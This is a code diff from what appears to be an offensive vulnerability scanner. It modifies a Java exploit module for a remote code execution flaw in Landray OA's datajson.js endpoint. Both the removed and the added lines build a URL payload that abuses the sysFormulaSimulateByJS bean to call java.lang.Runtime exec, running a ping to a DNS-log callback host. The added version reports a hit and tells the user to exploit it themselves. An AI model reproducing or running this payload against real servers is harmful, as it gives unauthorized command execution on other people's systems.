@@ -22,26 +22,17 @@ public class landray_datajson implements Exploitlnterface {
     }
 
     private Boolean att(String url,TextArea textArea){
+        String dnslog = shell.readFile(shell.dnspath).replace("http://","").replace("/","");
         String dnspath = shell.readFile(shell.dnspath).replace("http://","");
-        String replace = dnspath.replace("/", "");
-        String payload = "?s_bean=sysFormulaSimulateByJS&script=function%20test(){%20return%20java.lang.Runtime};r=test();r.getRuntime().exec(\"ping%20" + replace + "\")&type=1";
-        Response dns_le1 = HttpTools.get(shell.readFile(shell.dnscofpath), new HashMap<String, String>(), "utf-8");
-        int dns_1 = dns_le1.getText().length();
-
+        String payload = "/data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function%20test()%7B%20return%20java.lang.Runtime%7D;r=test();r.getRuntime().exec(%22ping%20-c%204%20" + shell.getRandomString() + "." + dnslog+"%22)&type=1";
         Response response = HttpTools.get(url + payload, new HashMap<String, String>(), "utf-8");
-
-        try { Thread.sleep (5000) ;
-        } catch (Exception ie){}
-
-        Response dns_le2 = HttpTools.get(shell.readFile(shell.dnscofpath), new HashMap<String, String>(), "utf-8");
-        int dns_2 = dns_le2.getText().length();
-
-        if(dns_2 > dns_1){
-            textArea.appendText("\n漏洞存在-收到dnslog回显  \n " + url + payload + "\n");
+        if(response.getCode() == 200 && response.getText().contains("success")){
+            textArea.appendText("\n漏洞存在 请自行利用\n" + url + payload);
             return true;
         }else {
-            textArea.appendText("\nlandray_datajson-RCE-漏洞不存在 (出现误报请联系作者)");
             return false;
         }
+
+
     }
 }
